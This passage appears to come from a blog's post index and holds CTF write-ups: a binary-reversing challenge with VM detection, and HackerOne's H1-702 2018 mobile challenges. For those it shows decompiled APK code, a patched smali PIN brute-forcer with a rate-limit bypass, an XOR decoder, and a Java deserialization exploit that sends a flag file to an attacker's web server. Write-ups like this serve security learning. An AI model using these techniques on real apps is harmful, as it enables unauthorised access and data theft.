fails, it sets a variable to 0 but doesn’t immediately stop the process. There are 14 such comparisons so the password is 14-byte long. 0x557b2e3e8a28 0fb64580 movzx eax, byte [rbp - 0x80] 0x557b2e3e8a2c 88857effffff mov byte [rbp - 0x82], al 0x557b2e3e8a32 4c89f8 mov rax, r15 0x557b2e3e8a35 480575240100 add rax, 0x12475 0x557b2e3e8a3b 0fb600 movzx eax, byte [rax] 0x557b2e3e8a3e 88857fffffff mov byte [rbp - 0x81], al 0x557b2e3e8a44 0fb6857effff. movzx eax, byte [rbp - 0x82] 0x557b2e3e8a4b 3a857fffffff cmp al, byte [rbp - 0x81] ,=&amp;lt; 0x557b2e3e8a51 750e jne 0x557b2e3e8a61 | 0x557b2e3e8a53 b800000000 mov eax, 0 | 0x557b2e3e8a58 e8cafeffff call 0x557b2e3e8927 | 0x557b2e3e8a5d 84c0 test al, al ,==&amp;lt; 0x557b2e3e8a5f 7407 je 0x557b2e3e8a68 |`-&amp;gt; 0x557b2e3e8a61 c6857dffffff. mov byte [rbp - 0x83], 0 `--&amp;gt; 0x557b2e3e8a68 0fb64581 movzx eax, byte [rbp - 0x7f] In each comparison, a function at 0x557b2e3e8927 is called. This function calls another function which involves the cpuid instruction, so my guess was that it detects virtual machines. [0x5555b0c259a0]&amp;gt; pd 24 @0x5555b0c258e0 | 0x5555b0c258e0 55 push rbp | 0x5555b0c258e1 4889e5 mov rbp, rsp | 0x5555b0c258e4 0f31 rdtsc | 0x5555b0c258e6 8945e8 mov dword [rbp - 0x18], eax | 0x5555b0c258e9 8955ec mov dword [rbp - 0x14], edx | 0x5555b0c258ec 8b45e8 mov eax, dword [rbp - 0x18] \\ 0x5555b0c258ef 8b55ec mov edx, dword [rbp - 0x14] 0x5555b0c258f2 48c1e220 shl rdx, 0x20 0x5555b0c258f6 4809d0 or rax, rdx 0x5555b0c258f9 488945f0 mov qword [rbp - 0x10], rax 0x5555b0c258fd b800000000 mov eax, 0 0x5555b0c25902 0fa2 cpuid 0x5555b0c25904 0f31 rdtsc 0x5555b0c25906 8945e8 mov dword [rbp - 0x18], eax 0x5555b0c25909 8955ec mov dword [rbp - 0x14], edx 0x5555b0c2590c 8b45e8 mov eax, dword [rbp - 0x18] 0x5555b0c2590f 8b55ec mov edx, dword [rbp - 0x14] 0x5555b0c25912 48c1e220 shl rdx, 0x20 0x5555b0c25916 4809d0 or rax, rdx 0x5555b0c25919 488945f8 mov qword [rbp - 8], rax 0x5555b0c2591d 488b45f8 mov rax, qword [rbp - 8] 0x5555b0c25921 482b45f0 sub rax, qword [rbp - 0x10] 0x5555b0c25925 5d pop rbp 0x5555b0c25926 c3 ret I was able to go through all such comparisons manually and extract the password: ThisIsATriumph. I think my guess about the VM detection was correct since I was running the binary inside a VM and the extracted password didn’t result in a “winning-output”. I submitted the flag and it was correct :)" }, { "title": "H1-702 CTF 2018", "url": "/posts/H1-702-CTF-2018/", "categories": "CTF, mobile", "tags": "ctf, mobile, android", "date": "2018-06-29 20:48:43 +0800", "snippet": "It’s this time of the year again and I have the chance to play the CTF held by Hackerone. It has a lot of mobile hacking challenge, and at the same time, I wanted to dive into this. What a good time to learn!Update 1: I totally forgot the fifth part of the flag in the first challenge while I was writing this. That’s what it’s like rushing a post :)Mobile Challenge 1Let’s open up the apk in jadx. The first part of the flag is revealed in the MainActivity: flag{so_much... void doSomething() { Log.d(&quot;Part 1&quot;, &quot;The first part of your flag is: \\&quot;flag{so_much\\&quot;&quot;); }}The fourth part is represented in a function in the same packagepackage com.hackerone.mobile.challenge1;public class FourthPart { String eight() { return &quot;w&quot;; } String five() { return &quot;_&quot;; } String four() { return &quot;h&quot;; } String one() { return &quot;m&quot;; } String seven() { return &quot;o&quot;; } String six() { return &quot;w&quot;; } String three() { return &quot;c&quot;; } String two() { return &quot;u&quot;; }}To get the fourth part, we only need to rearrange the characters in the order of the function name and we get much_wowThe third part is found in the strings.xml file in the values folder: analysis_&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;resources&amp;gt; ... &amp;lt;string name=&quot;app_name&quot;&amp;gt;Challenge 1&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;part_3&quot;&amp;gt;part 3: analysis_&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;search_menu_title&quot;&amp;gt;Search&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;status_bar_notification_info_overflow&quot;&amp;gt;999+&amp;lt;/string&amp;gt;&amp;lt;/resources&amp;gt;Opening up the native library in a disassembler or just simply run strings on the file, we can see part two of the flag: _static_I tried putting all these together but it was not the flag. I then noticed some weird functions in the native lib.Grabbing the characters in the order of the functions on the left yeild _and_cool}. That’s probably the last part of the flag.Putting all of these together, we get flag{so_much_static_analysis_much_wow_and_cool}Mobile Challenge 2Install the app and open it, we are presented with an interface like a lockTry to enter a password, and we can see some log from the app in logcat:06-30 22:57:14.849 2994 2994 D PinLock : Pin complete: 12111106-30 22:57:14.849 2994 2994 D TEST : 00000000B93BFEBB00000000000000001CA70C341CA70C341CA70C34A59CF28F06-30 22:57:14.849 2994 2994 D PROBLEM : Unable to decrypt textLet’s open the apk again in jadx and investigate. Note the onComplete method, it is called when the pin is finished: public void onComplete(String str) { String str2 = MainActivity.this.TAG; StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(&quot;Pin complete: &quot;); stringBuilder.append(str); Log.d(str2, stringBuilder.toString()); str = MainActivity.this.getKey(str); Log.d(&quot;TEST&quot;, MainActivity.bytesToHex(str)); try { Log.d(&quot;DECRYPTED&quot;, new String(new SecretBox(str).decrypt(&quot;aabbccddeeffgghhaabbccdd&quot;.getBytes(), MainActivity.this.cipherText), StandardCharsets.UTF_8)); } catch (RuntimeException e) { Log.d(&quot;PROBLEM&quot;, &quot;Unable to decrypt text&quot;); e.printStackTrace(); }}So the app work as following: Once the user finishes entering a pin, the onComplete method is called on the pin The pin string goes through the function getKey in the native lib The derived key is they used to decrypt the ciphertext with the nonce of aabbccddeeffgghhaabbccdd. The encryption is carried out using libsodiumThere are 2 approaches: Reverse engineering the encrpytion algorithm and solve for the password Bruteforce ;) The key is only 6-digit long so that means 1M passwords in total.I then patched the smali code perform a bruteforce on all possible keys when the onEmpty event is triggered.Patched smali file MainActivity$1.smali.method public onEmpty()V .locals 1 invoke-virtual {p0}, Lcom/hackerone/mobile/challenge2/MainActivity$1;-&amp;gt;hack()V return-void.end method.method public hack()V .locals 8 .prologue .line 15 const/4 v0, 0x0 move v1, v0 :goto_2 const v0, 0xf4240 if-ge v1, v0, :cond_2f .line 16 invoke-static {v1}, Ljava/lang/Integer;-&amp;gt;toString(I)Ljava/lang/String; move-result-object v0 .line 17 :goto_b invoke-virtual {v0}, Ljava/lang/String;-&amp;gt;length()I move-result v2 const/4 v3, 0x6 if-ge v2, v3, :cond_26 .line 18 new-instance v2, Ljava/lang/StringBuilder; invoke-direct {v2}, Ljava/lang/StringBuilder;-&amp;gt;&amp;lt;init&amp;gt;()V const-string v3, &quot;0&quot; invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;-&amp;gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder; move-result-object v2 invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;-&amp;gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder; move-result-object v0 invoke-virtual {v0}, Ljava/lang/StringBuilder;-&amp;gt;toString()Ljava/lang/String; move-result-object v0 goto :goto_b .line 20 :cond_26 const-string v4, &quot;TRYING&quot; invoke-static {v4, v0}, Landroid/util/Log;-&amp;gt;d(Ljava/lang/String;Ljava/lang/String;)I iget-object v4, p0, Lcom/hackerone/mobile/challenge2/MainActivity$1;-&amp;gt;this$0:Lcom/hackerone/mobile/challenge2/MainActivity; invoke-virtual {v4, v0}, Lcom/hackerone/mobile/challenge2/MainActivity;-&amp;gt;getKey(Ljava/lang/String;)[B move-result-object v0 new-instance v4, Lorg/libsodium/jni/crypto/SecretBox; invoke-direct {v4, v0}, Lorg/libsodium/jni/crypto/SecretBox;-&amp;gt;&amp;lt;init&amp;gt;([B)V const-string v5, &quot;aabbccddeeffgghhaabbccdd&quot; invoke-virtual {v5}, Ljava/lang/String;-&amp;gt;getBytes()[B move-result-object v5 :try_start_0 iget-object v6, p0, Lcom/hackerone/mobile/challenge2/MainActivity$1;-&amp;gt;this$0:Lcom/hackerone/mobile/challenge2/MainActivity; invoke-static {v6}, Lcom/hackerone/mobile/challenge2/MainActivity;-&amp;gt;access$000(Lcom/hackerone/mobile/challenge2/MainActivity;)[B move-result-object v6 invoke-virtual {v4, v5, v6}, Lorg/libsodium/jni/crypto/SecretBox;-&amp;gt;decrypt([B[B)[B move-result-object v6 .line 44 new-instance v5, Ljava/lang/String; sget-object v4, Ljava/nio/charset/StandardCharsets;-&amp;gt;UTF_8:Ljava/nio/charset/Charset; invoke-direct {v5, v6, v4}, Ljava/lang/String;-&amp;gt;&amp;lt;init&amp;gt;([BLjava/nio/charset/Charset;)V const-string v6, &quot;DECRYPTED&quot; .line 46 invoke-static {v6, v5}, Landroid/util/Log;-&amp;gt;d(Ljava/lang/String;Ljava/lang/String;)I :try_end_0 .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0 goto :cond_2f :catch_0 move-exception v7 const-string v5, &quot;PROBLEM&quot; const-string v4, &quot;Unable to decrypt text&quot; .line 48 invoke-static {v5, v4}, Landroid/util/Log;-&amp;gt;d(Ljava/lang/String;Ljava/lang/String;)I .line 49 invoke-virtual {v7}, Ljava/lang/RuntimeException;-&amp;gt;printStackTrace()V .line 15 add-int/lit8 v0, v1, 0x1 move v1, v0 goto :goto_2 .line 22 :cond_2f return-void.end methodThe decompiled code after patching looks like thisclass C03091 implements PinLockListener { public void onEmpty() { hack(); } public void hack() { int i = 0; while (i &amp;lt; 1000000) { String num = Integer.toString(i); while (num.length() &amp;lt; 6) { num = &quot;0&quot; + num; } Log.d(&quot;TRYING&quot;, num); try { Log.d(&quot;DECRYPTED&quot;, new String(new SecretBox(MainActivity.this.getKey(num)).decrypt(&quot;aabbccddeeffgghhaabbccdd&quot;.getBytes(), MainActivity.this.cipherText), StandardCharsets.UTF_8)); return; } catch (RuntimeException e) { Log.d(&quot;PROBLEM&quot;, &quot;Unable to decrypt text&quot;); e.printStackTrace(); i++; } } }...I then ran the patched APK and waiting for the bruteforce to finished, not noticed that there is a rate limit on the native getKey function. It was only performing about 50 tries every 10 seconds. I decided to investigate the native library to find out the rate limit.I did not really understand all the functions in the library, and decided to replace numerical values where it appeared to see if the rate limit is changed. After some trials and errors, I finally figured out that the rate limit was carried out in the Java_com_hackerone_mobile_challenge2_MainActivity_getKey function.Notice the numerical value in the cmp operation, which is 51. That explains the rate I observed before in the log. I did attempt to patch the timing but did not succeed. Patching this did change the rate limit.Note that there are more bytes occupied by the 2 instructions (the cmp and the jump right after that) after patching than before patching. The bytes changed from 83 F8 33 72 64 to 3D 37 13 37 13 72 62. Please also note that I am patching the x86 library while solving this challenge.After running for a while, the bruteforce will stop when it finds the correct pin:06-30 23:58:42.117 5134 5134 W System.err: at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:858)06-30 23:58:42.117 5134 5134 D TRYING : 91826406-30 23:58:42.117 5134 5134 D DECRYPTED: flag{wow_yall_called_a_lot_of_func$}The correct pin is 918264 and the flag is flag{wow_yall_called_a_lot_of_func$}Mobile Challenge 3In this challenge, we are given a base.odex file and a boot.oat file. Basically, odex stands for optimized-dex, which is byte codes optimized for a specific device. To be able to obtain the dex file, we need to deodex the file. A tool that I found doing this job is baksmali. I ran the tool on the files but it was not successful. It was missing references to some methods.➜ chal3 git:(master) ✗ java -Xmx512m -jar baksmali.jar x base.odex -c boot.oat -o test_out org.jf.dexlib2.analysis.AnalysisException: Could not resolve the method in class Landroid/support/v7/widget/MenuPopupWindow$MenuDropDownListView; at index 1053 at org.jf.dexlib2.analysis.MethodAnalyzer.analyzeInvokeVirtualQuick(MethodAnalyzer.java:1824) at org.jf.dexlib2.analysis.MethodAnalyzer.analyzeInstruction(MethodAnalyzer.java:1040) at org.jf.dexlib2.analysis.MethodAnalyzer.analyze(MethodAnalyzer.java:201) at org.jf.dexlib2.analysis.MethodAnalyzer.&amp;lt;init&amp;gt;(MethodAnalyzer.java:131) at org.jf.baksmali.Adaptors.MethodDefinition.addAnalyzedInstructionMethodItems(MethodDefinition.java:464) at org.jf.baksmali.Adaptors.MethodDefinition.getMethodItems(MethodDefinition.java:371) at org.jf.baksmali.Adaptors.MethodDefinition.writeTo(MethodDefinition.java:238) at org.jf.baksmali.Adaptors.ClassDefinition.writeVirtualMethods(ClassDefinition.java:326) at org.jf.baksmali.Adaptors.ClassDefinition.writeTo(ClassDefinition.java:112) at org.jf.baksmali.Baksmali.disassembleClass(Baksmali.java:152) at org.jf.baksmali.Baksmali.access$000(Baksmali.java:46) at org.jf.baksmali.Baksmali$1.call(Baksmali.java:76) at org.jf.baksmali.Baksmali$1.call(Baksmali.java:74) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)opcode: invoke-virtual-quickcode address: 5method: Landroid/support/v7/widget/MenuPopupWindow;-&amp;gt;createDropDownListView(Landroid/content/Context;Z)Landroid/support/v7/widget/DropDownListView;After many trials and errors, and realized that the methods are from the android SDK, I copied the android folder from one of the previous challenges and use it with baksmali to deodex the file, hoping that it would work, and it did. I was able to pull out the main logic from the application and that was really fortunate.mkdir frameworkmv android framework # This is the android folder when you use apktool to unpack the apk from previous challengesjava -jar smali.jar ass -o framework.dex frameworkjava -Xmx512m -jar baksmali.jar x -c framework.dex base.odex -o chal3java -jar ../smali.jar ass chal3 -o chal3.dexpackage com.hackerone.mobile.challenge3;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.text.Editable;import android.text.TextWatcher;import android.widget.EditText;public class MainActivity extends AppCompatActivity { private static char[] key = new char[]{&#39;t&#39;, &#39;h&#39;, &#39;i&#39;, &#39;s&#39;, &#39;_&#39;, &#39;i&#39;, &#39;s&#39;, &#39;_&#39;, &#39;a&#39;, &#39;_&#39;, &#39;k&#39;, &#39;3&#39;, &#39;y&#39;}; private EditText editText; protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView((int) C0225R.layout.activity_main); final EditText editText = (EditText) findViewById(C0225R.id.editText); editText.addTextChangedListener(new TextWatcher() { public void afterTextChanged(Editable editable) { } public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) { } public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) { MainActivity.checkFlag(editText.getText().toString()); } }); } public static byte[] hexStringToByteArray(String str) { int length = str.length(); byte[] bArr = new byte[(length / 2)]; for (int i = 0; i &amp;lt; length; i += 2) { bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) &amp;lt;&amp;lt; 4) + Character.digit(str.charAt(i + 1), 16)); } return bArr; } public static boolean checkFlag(String str) { if (str.length() == 0) { return false; } String str2 = &quot;flag{&quot;; if ((str.length() &amp;gt; str2.length() &amp;amp;&amp;amp; !str.substring(0, str2.length()).equals(str2)) || str.charAt(str.length() - 1) != &#39;}&#39;) { return false; } String encryptDecrypt = encryptDecrypt(key, hexStringToByteArray(new StringBuilder(&quot;kO13t41Oc1b2z4F5F1b2BO33c2d1c61OzOdOtO&quot;).reverse().toString().replace(&quot;O&quot;, &quot;0&quot;).replace(&quot;t&quot;, &quot;7&quot;).replace(&quot;B&quot;, &quot;8&quot;).replace(&quot;z&quot;, &quot;a&quot;).replace(&quot;F&quot;, &quot;f&quot;).replace(&quot;k&quot;, &quot;e&quot;))); if (str.length() &amp;lt;= str.length() || str.substring(str2.length(), str.length() - 1).equals(encryptDecrypt) != null) { return true; } return false; } private static String encryptDecrypt(char[] cArr, byte[] bArr) { StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i &amp;lt; bArr.length; i++) { stringBuilder.append((char) (bArr[i] ^ cArr[i % cArr.length])); } return stringBuilder.toString(); }}The logic is pretty straightforward. I wrote a python script to solve the challenge.def main(): key = [&#39;t&#39;, &#39;h&#39;, &#39;i&#39;, &#39;s&#39;, &#39;_&#39;, &#39;i&#39;, &#39;s&#39;, &#39;_&#39;, &#39;a&#39;, &#39;_&#39;, &#39;k&#39;, &#39;3&#39;, &#39;y&#39;] key = &#39;&#39;.join(key) print &quot;key = {}&quot;.format(key) s = &quot;kO13t41Oc1b2z4F5F1b2BO33c2d1c61OzOdOtO&quot; s = s[::-1] s = s.replace(&quot;O&quot;, &quot;0&quot;).replace(&quot;t&quot;, &quot;7&quot;).replace(&quot;B&quot;, &quot;8&quot;).replace(&quot;z&quot;, &quot;a&quot;).replace(&quot;F&quot;, &quot;f&quot;).replace(&quot;k&quot;, &quot;e&quot;) print &quot;s = {}&quot;.format(s) s = s.decode(&#39;hex&#39;) print &quot;hex decoded s = {}&quot;.format(s) key = (key * 10)[:len(s)] print &#39;&#39;.join([chr(ord(x[0]) ^ ord(x[1])) for x in zip(s, key)])if __name__ == &#39;__main__&#39;: main()The flag is flag{secr3t_littl3_th4ng}.Mobile Challenge 4This is probably my favorite one because I learned so much more in this challenge, from writing my first android app to learning about vulnerabilities that an application can introduce.At first, I didn’t know where to start because I have not tried to pwn an apk application before. Looking at tools to scan for vulnerabilities in APKs, I found QARK, a pretty neat tool from LinkedIn that can be used to quickly scan for common vulnerabilities in an android application, using mostly static analysis.At the same time, I read the setup instruction and kinda had a sense of what I have to do: The flag file is at /data/local/tmp/challenge4 The owner of the file is root, the owner group is the same group as the vulnerable application.Since we have to exploit the application, my guess was that we need to somehow use the vulnerable app’s permission to read the flag file. When the scan from QARK finish, I skimmed through the report and noticed thisINFO - Be careful with use of Check permission functionApp maybe vulnerable to Privilege escalation or Confused Deputy Attack. This function can grant access to malicious application, lacking the appropriate permission, by assuming your applications permissions. This means a malicious application, without appropriate permissions, can bypass its permission check by using your applicationpermission to get access to otherwise denied resources. Use - checkCallingPermission instead.Filepath: /home/me/Desktop/challenge4_release/classes_dex2jar/android/support/v4/app/NotificationCompatSideChannelService.javaReference: https://developer.android.com/reference/android/content/Context.html#checkCallingOrSelfPermission(java.lang.String)And also this==&amp;gt;EXPORTED ACTIVITIES: 0: com.hackerone.mobile.challenge4.MenuActivityINFO - Checking for extras in this file: com.hackerone.mobile.challenge4.MenuActivity from this entry point: onCreateERROR - Could not create a tree to find extras in : /home/me/Desktop/challenge4_release/classes_dex2jar/com/hackerone/mobile/challenge4/MenuActivity.javaINFO - Attempting fall-back method to determine extrasINFO - Checking for extras in this file: com.hackerone.mobile.challenge4.MenuActivity from this entry point: onStartERROR - Could not create a tree to find extras in : /home/me/Desktop/challenge4_release/classes_dex2jar/com/hackerone/mobile/challenge4/MenuActivity.javaINFO - Attempting fall-back method to determine extrasadb shell am start -a &quot;android.intent.action.MAIN&quot; -n &quot;com.hackerone.mobile.challenge4/com.hackerone.mobile.challenge4.MenuActivity&quot;==&amp;gt;EXPORTED RECEIVERS: 0: com.hackerone.mobile.challenge4.MazeMoverINFO - Checking for extras in this file: com.hackerone.mobile.challenge4.MazeMover from this entry point: onReceiveINFO - Possible Extra: localObject of unknown typeINFO - Possible Extra: &quot;cereal&quot; of type: SerializableINFO - Extra: localObject is not a simple type, or could not be determined. You&#39;ll need to append the parameter which corresponds with the correct data type, followed by a key and value, both in quotes.Example: adb shell am broadcast -a &quot;com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER&quot; --es &quot;YOURKEYHERE&quot; &quot;YOURVALUEHERE&quot;Here are your options for different data types: [-e|--es &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_STRING_VALUE&amp;gt; ...][--esn &amp;lt;EXTRA_KEY&amp;gt; ...][--ez &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_BOOLEAN_VALUE&amp;gt; ...][--ei &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_INT_VALUE&amp;gt; ...][--el &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_LONG_VALUE&amp;gt; ...][--ef &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_FLOAT_VALUE&amp;gt; ...][--eu &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_URI_VALUE&amp;gt; ...][--ecn &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_COMPONENT_NAME_VALUE&amp;gt;][--eia &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_INT_VALUE&amp;gt;[,&amp;lt;EXTRA_INT_VALUE...]][--ela &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_LONG_VALUE&amp;gt;[,&amp;lt;EXTRA_LONG_VALUE...]][--efa &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_FLOAT_VALUE&amp;gt;[,&amp;lt;EXTRA_FLOAT_VALUE...]][--esa &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_STRING_VALUE&amp;gt;[,&amp;lt;EXTRA_STRING_VALUE...]]INFO - Extra: &quot;cereal&quot; is not a simple type, or could not be determined. You&#39;ll need to append the parameter which corresponds with the correct data type, followed by a key and value, both in quotes.Example: adb shell am broadcast -a &quot;com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER&quot; --es &quot;YOURKEYHERE&quot; &quot;YOURVALUEHERE&quot;Here are your options for different data types: [-e|--es &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_STRING_VALUE&amp;gt; ...][--esn &amp;lt;EXTRA_KEY&amp;gt; ...][--ez &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_BOOLEAN_VALUE&amp;gt; ...][--ei &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_INT_VALUE&amp;gt; ...][--el &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_LONG_VALUE&amp;gt; ...][--ef &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_FLOAT_VALUE&amp;gt; ...][--eu &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_URI_VALUE&amp;gt; ...][--ecn &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_COMPONENT_NAME_VALUE&amp;gt;][--eia &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_INT_VALUE&amp;gt;[,&amp;lt;EXTRA_INT_VALUE...]][--ela &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_LONG_VALUE&amp;gt;[,&amp;lt;EXTRA_L..m,mmONG_VALUE...]][--efa &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_FLOAT_VALUE&amp;gt;[,&amp;lt;EXTRA_FLOAT_VALUE...]][--esa &amp;lt;EXTRA_KEY&amp;gt; &amp;lt;EXTRA_STRING_VALUE&amp;gt;[,&amp;lt;EXTRA_STRING_VALUE...]]I did not know what this was at that moment. However, it seemed interesting because of the keywords like cereal and also serializable objects, which I heard of vulnerabilities related to this but in PHP. Let’s open the app in jadx to investigate the sauce!I opened up the class MazeMover in the report and the code was quite interesting:public class MazeMover { public static void onReceive(Context context, Intent intent) { if (MainActivity.getMazeView() == null) { Log.i(&quot;MazeMover&quot;, &quot;Not currently trying to solve the maze&quot;); return; } GameManager gameManager = MainActivity.getMazeView().getGameManager(); Bundle extras = intent.getExtras(); if (extras != null) { if (intent.hasExtra(&quot;get_maze&quot;)) { intent = new Intent(); intent.putExtra(&quot;walls&quot;, gameManager.getMaze().getWalls()); Serializable arrayList = new ArrayList(); arrayList.add(Integer.valueOf(gameManager.getPlayer().getX())); arrayList.add(Integer.valueOf(gameManager.getPlayer().getY())); arrayList.add(Integer.valueOf(gameManager.getExit().getX())); arrayList.add(Integer.valueOf(gameManager.getExit().getY())); intent.putExtra(&quot;positions&quot;, arrayList); intent.setAction(&quot;com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER&quot;); context.sendBroadcast(intent); } else if (intent.hasExtra(&quot;move&quot;)) { intent = extras.getChar(&quot;move&quot;); int i = -1; int i2 = 0; switch (intent) { case 104: i2 = -1; i = 0; break; case 106: i = 1; break; case 107: break; case 108: i = 0; i2 = 1; break; default: i = 0; break; } intent = new Point(i2, i); Intent intent2 = new Intent(); if (gameManager.movePlayer(intent) != null) { intent2.putExtra(&quot;move_result&quot;, &quot;good&quot;); } else { intent2.putExtra(&quot;move_result&quot;, &quot;bad&quot;); } intent2.setAction(&quot;com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER&quot;); context.sendBroadcast(intent2); } else if (intent.hasExtra(&quot;cereal&quot;)) { ((GameState) intent.getSerializableExtra(&quot;cereal&quot;)).initialize(context); } } }}I would like to quickly explain some of the concepts that I’ve learned during the proccess of understanding this piece of code. There may be incorrect details because this is my first time attempting to do mobile hacking. I would appreciate any comments that would correct me.Firstly, the way android applications are able to interact with each other is by broadcasting and listening for messages. Such messages are called Intents. Each intent needs to indicate an action that it wants to carry out, and there may be parameters to this actions. These parameters are called extras. Extras can be of many types, from String, Integer to Serializable objects.Secondly, an app by declaring a broadcast receiver is able to listen to intents, and by declaring the intent filters, it can determine if the receiver will be processing the intent or not, based on the action in the intent.Going back to the piece of code above, what it does is defining an event handler when an intent is received. If an intent with an extra key get_maze is received, broadcast an intent with the information of the current maze view including the positions of the player and the exit, the walls positions If an intent with an extra key move is received, get the move value as a character and attempt to move the player accordingly, then broadcast the result of the move If an intent with an extra key cereal is received, get the serializable object in the value, cast it to GameState type and then call the initialize method on the current contextAfter understanding intents and stuffs, I found out another broadcast receiver was declared in the MenuActivity to start the game.With the knowledge of all the broadcast receivers, we know that we can interact with the game play and also execute codes in the applicatioin by passing a serializable object to the intent. The code execution, however, is really limited, but I was determined that this is the way to get the flag and decided to investigate the code paths leading to and from the cereal intent extra.Let’s investigate the code of the GameState class:package com.hackerone.mobile.challenge4;import android.content.Context;import android.util.Log;import java.io.Serializable;public class GameState implements Serializable { private static final long serialVersionUID = 1; public String cleanupTag; private Context context; public int levelsCompleted; public int playerX; public int playerY; public long seed; public StateController stateController; public GameState(int i, int i2, long j, int i3) { this.playerX = i; this.playerY = i2; this.seed = j; this.levelsCompleted = i3; } public GameState(String str, StateController stateController) { this.cleanupTag = str; this.stateController = stateController; } public void initialize(Context context) { this.context = context; GameState gameState = (GameState) this.stateController.load(context); if (gameState != null) { this.playerX = gameState.playerX; this.playerY = gameState.playerY; this.seed = gameState.seed; this.levelsCompleted = gameState.levelsCompleted; } } public void finalize() { Log.d(&quot;GameState&quot;, &quot;Called finalize on GameState&quot;); if (GameManager.levelsCompleted &amp;gt; 2 &amp;amp;&amp;amp; this.context != null) { this.stateController.save(this.context, this); } }}There are several interesting details here: Most of the fields are not interesting, except for the stateController one. The stateController is used to call its method in the initialize function There is a finialize method, in which the stateController is being used again after some conditions are satisfied: More than 2 levels are completed The current context is not null There are 2 constructors of this class. In one of them, we can initialize the stateController field.I smell some more code executionKeep investigating other classes, I found out that there are 2 subclasses extending the StateController class: StateLoader and BroadcastAnnouncer. At this point, I kinda have an idea in mind to test out the code execution by initialize a GameState instance with a StateController, in which the StateController is also initialized with some field that ressembles a file location. However, there are several differences between the 2 subclasses. In the load method, StateLoader uses the location field in the super class to open a file, and read an object from the file. The BroadcastAnnouncer also opens a file but reads in strings from that file. The string from the file is used to make HTTP requests in other methods in the class. The save method in StateLoader write objects to file and it makes HTTP requests mentioned before in BroadcastAnnoucner. The destination of the HTTP requests and the file location are all user controllable.At this point, putting all we have together, we can plan out an exploit: Instantiate a BroadcastAnnouncer with the flag file location and a destination to a web server that we control. The reason for this is quite clear because the data type that BroadcastAnnouncer deals with is the same as it is in the flag file, which is string. StateLoader, however, deals with serializable objects. Instantiate a GameState with the BroadcastAnnouncer above. Send an intent to the vulnerable app with the cereal extra and the GameState object. Somehow trigger the save method in the StateController.At the last step, going back to the finalize method in GameState, we can see that the save method is called here, but only after satisfying some conditions. But when is the finalize method being called?I at that point did not notice the finalize method. I crafted the exploit, play some levels in the game and trigger the exploit. It was working inconsistently but it yeilded the flag! Later on, I did some search and figured out that the finalize method is called by the Garbage Collector of JVM, when there is no reference to the instance anymore. This is quite interesting, but that’s all I know. My guess for why it works is that when we sent the object in the intent, it was instantiated but not being used anywhere else in the code and got garbage collected eventually, triggering the finalize method.Now the only problem is that we have to solve more than 2 levels to trigger the code path to the save method. We can interact with the game, start it, move the player, get the maze state. A simple algorithm that would solve the maze is Depth-First Search.The source code of my exploit app can be found here. I would like to explain some of the stuffs that I did in the exploit.While I was playing with broadcasting intents, from the adb shell or from an APK, I encounter this warning BroadcastQueue: Background execution not allowed: receiving Intent..., which did not call the onReceive handler and the code did not executed accordingly. This is due to the background process limitation starting from Android O. I found a blog post that describe the workaround hereBasically, to work around this, I both had to register a receiver in my MainActivity and define the targetSdkVersion of 25. I am still not sure if that totally solves the problem or not because broadcasting intents still doesn’t work sometimes, but it was a lot better than before.This problem and also the asynchronous broadcasts is why I had to delay the broadcasts sending from my application. It’s kinda a workaround so that codes can run synchronously as intended. If you have any questions about my code, please feel free to leave a comments or hit me up on any of my social networks. I am willing to discuss the matters with you. The code at the time of writing this blog is still messy, I will try to clean it up asap!After tweaking the exploit several times, I sent the APK to @breadchris. It was night time at my place so I went to bed. The next day, my exploit was run and I couldn’t be happier when I saw the flag in my web server log.pwned! The flag is flag{my_favorite_cereal_and_mazes}.Thanks for a great CTF @Hackerone!" }, { "title": "GRIMM HAX Combined Challenge", "url": "/posts/GRIMM-HAX-Combined-Challenge/", "categories": 